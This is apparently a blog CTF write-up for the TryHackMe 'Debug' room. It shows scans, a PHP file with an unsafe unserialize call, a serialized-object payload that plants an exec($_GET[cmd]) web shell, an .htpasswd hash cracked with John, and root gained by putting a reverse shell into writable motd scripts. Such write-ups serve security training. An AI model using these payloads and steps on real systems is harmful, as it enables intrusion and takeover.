---
layout: post
title: Debug
date: 2022-05-06 10:18:00
categories: [Web, Serialization, Tryhackme]
---
> VOiD XD

> Target IP : 10.10.41.176

This is short writup for [Debug](https://tryhackme.com/room/debug) (Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!) on [Tryhackme](https://tryhackme.com)
Go check it out.

## Rustscan

```bash
rustscan -a 10.10.41.176 -b 1000 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.41.176:22
Open 10.10.41.176:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 12:37 EDT
Initiating Ping Scan at 12:37
Scanning 10.10.41.176 [2 ports]
Completed Ping Scan at 12:37, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:37
Completed Parallel DNS resolution of 1 host. at 12:37, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:37
Scanning 10.10.41.176 [2 ports]
Discovered open port 80/tcp on 10.10.41.176
Discovered open port 22/tcp on 10.10.41.176
Completed Connect Scan at 12:37, 0.30s elapsed (2 total ports)
Nmap scan report for 10.10.41.176
Host is up, received conn-refused (0.31s latency).
Scanned at 2022-05-06 12:37:41 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds

```

## Nmap
```bash
nmap -sC -sV -vv 10.10.41.176 -oN scans/init 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 12:37 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:37
Completed NSE at 12:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:37
Completed NSE at 12:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:37
Completed NSE at 12:37, 0.00s elapsed
Initiating Ping Scan at 12:37
Scanning 10.10.41.176 [2 ports]
Completed Ping Scan at 12:37, 0.48s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:37
Completed Parallel DNS resolution of 1 host. at 12:37, 0.14s elapsed
Initiating Connect Scan at 12:37
Scanning 10.10.41.176 [1000 ports]
Discovered open port 80/tcp on 10.10.41.176
Discovered open port 22/tcp on 10.10.41.176
Increasing send delay for 10.10.41.176 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.41.176 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.41.176 from 10 to 20 due to max_successful_tryno increase to 6
Completed Connect Scan at 12:37, 35.95s elapsed (1000 total ports)
Initiating Service scan at 12:37
Scanning 2 services on 10.10.41.176
Completed Service scan at 12:38, 6.55s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.41.176.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 10.20s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.97s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Nmap scan report for 10.10.41.176
Host is up, received syn-ack (0.27s latency).
Scanned at 2022-05-06 12:37:21 EDT for 53s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs=
|   256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.59 seconds
```

## Gobuster
```bash
gobuster dir --url http://10.10.41.176/ --wordlist=/usr/share/wordlists/dirb/common.txt -x txt,php,html -t 40 | tee go.log

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.41.176/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/05/06 12:39:34 Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 301) [Size: 313] [--> http://10.10.41.176/backup/]
/grid                 (Status: 301) [Size: 311] [--> http://10.10.41.176/grid/]  
/index.html           (Status: 200) [Size: 11321]                                
/index.html           (Status: 200) [Size: 11321]                                
/index.php            (Status: 200) [Size: 5732]                                 
/index.php            (Status: 200) [Size: 5732]                                 
/javascripts          (Status: 301) [Size: 318] [--> http://10.10.41.176/javascripts/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.41.176/javascript/] 
/message.txt          (Status: 200) [Size: 94]                                        
/server-status        (Status: 403) [Size: 277]                                       
===============================================================
2022/05/06 12:42:25 Finished
===============================================================


```

## PORT 80 [Apache httpd 2.4.18]

http://10.10.41.176/backup/

It contains some backups files of server.


http://10.10.41.176/index.php

Has some message sending functionality.

http://10.10.41.176/message.txt

Displays the message sent.

Important php code of index.php from the backup.
```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```

Here we can clearly see `unserialize` being used to the `GET parameter send from debug`

```php
<?php
class FormSubmit 
{

        public $form_file = 'backup/shell.php';
        public $message = "<?php%20echo%20exec(\$_GET[cmd])%20?>";
}

$serial = serialize(new FormSubmit);
print $serial;
?>
```


Payload : `O:10:"FormSubmit":2:{s:9:"form_file";s:16:"backup/shell.php";s:7:"message";s:30:"<?php%20echo%20exec($_GET[cmd])%20?>";}`


## USER [www-data]
```bash
www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1


 john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jamaica          (james)     
1g 0:00:00:00 DONE (2022-05-06 13:54) 33.33g/s 25600p/s 25600c/s 25600C/s evelyn..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   
```


## USER [james]
```bash
james:jamaica

james@osboxes:~$ cat user.txt 
7e37c84a66cc40b1c6bf700d08d28c20

james@osboxes:~$ cat .bash_history 
ls
clear
exit
ls
clear
exit
ls
clear
exit
ls
cd /home/james/
ls
cat Note-To-James.txt 
ls
cd /etc/update-motd.d/
ls
ls -la
ls
clear
ls
clear
ls
clera
ls
clear
ls
clear
ls -la
cd /
ls
cd /root/
ls
exit
ls
clear
exit
nano id_rsa
chmod 600 id_rsa 
ssh -i id_rsa root@10.250.0.12
exit


james@osboxes:~$ cd /etc/update-motd.d/
james@osboxes:/etc/update-motd.d$ ls -la
total 44
drwxr-xr-x   2 root root   4096 Mar 10  2021 .
drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
-rwxrwxr-x   1 root james  1452 May  6 14:11 00-header
-rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm

```

These files are writeable by us. writing a reverse shell into 00-header and then loging into ssh gives us root shell.

```bash
root@osboxes:/root# cat root.txt 
3c8c3d0fe758c320d158e32f68fabf4b

```